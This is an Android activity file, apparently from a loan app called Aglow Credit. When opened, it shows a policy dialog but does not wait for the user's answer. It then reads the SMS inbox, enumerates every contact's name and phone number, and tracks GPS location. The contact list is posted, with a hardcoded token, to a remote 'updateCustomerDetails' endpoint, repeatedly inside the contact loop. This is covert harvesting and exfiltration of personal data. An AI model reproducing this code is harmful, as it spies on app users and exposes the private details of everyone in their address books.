package com.example.aglowmudra;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.fragment.app.FragmentManager;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import Fragment.FragmentPolicy;
import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import static android.provider.Telephony.Sms.CONTENT_URI;

public class AglowHomeActivity extends AppCompatActivity {
    final ArrayList<String> nameList = new ArrayList<>();
    ArrayList<String> phone = new ArrayList<>();
  double latitute;
  double longitude;
    String val1="";
    String val2="";

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_aglow_home);
        FragmentPolicy fragmentPolicy = new FragmentPolicy();
        FragmentManager fragmentManager = getSupportFragmentManager();
        fragmentPolicy.show(fragmentManager, "policy_mode");

        try {
            getSMs();
            getAllContacts();
            SendContact1();
            getLocation();
        }catch (Exception e){
            e.getStackTrace();
        }


    }

    private ArrayList getAllContacts() {
        Log.d("TAG", "Value is creted by system");
        String contact = "";

        Log.d("TAG", "Value is creted" + nameList);
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if ((cur != null ? cur.getCount() : 0) > 0) {
            Log.d("TAG", "VAlue in second");
            while (cur != null && cur.moveToNext()) {
                Log.d("TAG", "Value in third");
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                //    nameList.add(name);
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Log.d("TAG", "VAlue in fouth");
                    Cursor pCur = cr.query(

                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    while (pCur.moveToNext()) {
                        Log.d("TAG", "value in fivth");
                        String name1 = pCur.getString(pCur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        //    Log.d("TAG","Value is :"+name1 +" phone"+phoneNo);
                        // phone.add(name1);
                        // phone.add(phoneNo);
                        contact = name1 + " : " + phoneNo;
                        phone.add(contact);
                        SendContact1();
                        Log.d("TAG", "VAlue is creted in the end" + phone);
                    }
                    pCur.close();
                }

            }


            if (cur != null) {
                cur.close();
            }
        }
        return nameList;
    }

    public void SendContact() {
        Log.d("TAG", "Value is creted in otp");
        String toke = "5e1081856674";
        String sms = "adas";
        String url = "https://drfin.in/aglowcredit/api/updateCustomerDetails";
        RequestBody formBody = new FormBody.Builder()
                .add("auth_token", toke)
                .add("sms_list", sms)
                .add("contact_list", String.valueOf(phone))
                .build();

        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url(url)
                .post(formBody)

                .build();


        try {
            Response response = client.newCall(request).execute();
            Log.d("TAG", "Alue is response in aglow Activity" + response);
            String responseString = response.body().string();

            Log.d("TAG", "VAlue is responsestring In Aglow Activity" + responseString);
            try {
                JSONObject json = new JSONObject(responseString);
                String Active = json.getJSONObject("userdata").getString("is_active");
                Log.d("TAG", "value is frrrrrr in Aglow Activity" + Active);
                if (Active.equals("1")) {
//                    Intent intent = new Intent(AglowHomeActivity.this, AglowHomeActivity.class);
//                    startActivity(intent);
                }
            } catch (Exception e) {
                e.getStackTrace();

            }
        } catch (Exception e) {
            e.getStackTrace();
        }
    }

    public void SendContact1() {
        String Phone_number = "5e180861eb7d9";
        String Phone_No = "abbas";
        try {
            Log.d("TAG", "VAlue is creted aftewr  send data" + phone);
            String url = "https://drfin.in/aglowcredit/api/updateCustomerDetails";
            RequestBody formBody = new FormBody.Builder()
                    .add("auth_token", Phone_number)
                    .add("sms_list", Phone_No)
                    .add("contact_list", String.valueOf(phone))
                    .build();

            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder()
                    .url(url)
                    .post(formBody)
                    .build();
            Response response = client.newCall(request).execute();
            Log.d("TAG", "Alue is response1V" + response);


        } catch (Exception e) {
            e.getStackTrace();

        }

    }

    public void getSMs() {
        Log.d("TAG", "VAlue is created in sms ");
        ArrayList<String> arrayList = new ArrayList<>();
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            Log.d("TAG", "Value is creted in curser Lop");
            do {
                String msgData = "";
                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    Log.d("TAG", "Value is Creted");
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                    Log.d("TAG", "VAlue is created in system" + msgData);
                    arrayList.add(msgData);

                }
                // use msgDat
                Log.d("TAG", "VAlue is created when call" + arrayList);

            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
            Log.d("TAG", "VAlue if no sms Presnt");
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    public void getLocation() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    Activity#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for Activity#requestPermissions for more details.
            return;
        }
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, new LocationListener() {
            public void onStatusChanged(String provider, int status, Bundle extras) {
                // called when the location provider status changes. Possible status: OUT_OF_SERVICE, TEMPORARILY_UNAVAILABLE or AVAILABLE.
            }

            public void onProviderEnabled(String provider) {
                // called when the location provider is enabled by the user
            }

            public void onProviderDisabled(String provider) {
                // called when the location provider is disabled by the user. If it is already disabled, it's called immediately after requestLocationUpdates
            }

            public void onLocationChanged(Location location) {
                latitute = location.getLatitude();
                longitude = location.getLongitude();
                Log.d("TAG", "Value of latitude is :" + latitute);
                Log.d("TAG", "Value of latitude is :" + longitude);

            }

        });

        try {




            Geocoder geo = new Geocoder(this.getApplicationContext(), Locale.getDefault());
            List<Address> addresses = geo.getFromLocation(longitude, latitute, 1);
            if (addresses.isEmpty()) {
                Log.d("TAG", "Value is creted by address");
            } else {
                if (addresses.size() > 0) {
                    Log.d("TAG","Value of address"+addresses);
                    Log.d("TAG", "Location Name" + addresses.get(0).getFeatureName() + ", " + addresses.get(0).getLocality() + ", " + addresses.get(0).getAdminArea() + ", " + addresses.get(0).getCountryName());
//                    yourtextboxname.setText(addresses.get(0).getFeatureName() + ", " + addresses.get(0).getLocality() +", " + addresses.get(0).getAdminArea() + ", " + addresses.get(0).getCountryName());
                }
            }
        } catch (Exception e) {
            e.getStackTrace();

        }

    }

    @Override
    protected void onPause() {
        super.onPause();
        finish();
    }
}





